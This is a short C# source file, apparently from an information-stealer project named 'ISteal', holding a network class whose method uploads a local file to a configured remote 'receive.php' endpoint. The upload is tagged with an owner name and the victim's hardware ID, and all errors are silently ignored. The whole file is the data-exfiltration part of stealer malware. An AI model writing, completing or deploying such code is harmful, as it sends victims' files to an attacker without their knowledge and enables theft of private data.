using System.Net;

namespace ISteal.Hardware
{
    internal class Network
    {
        public Network() { }

        public static void UploadFile(string path)
        {
            try
            {
                new WebClient().UploadFile(RawSettings.SiteUrl + string.Format("receive.php?user={0}&hwid={1}", RawSettings.Owner, RawSettings.HWID), "POST", path);
            }
            catch (WebException) { }
        }
    }
}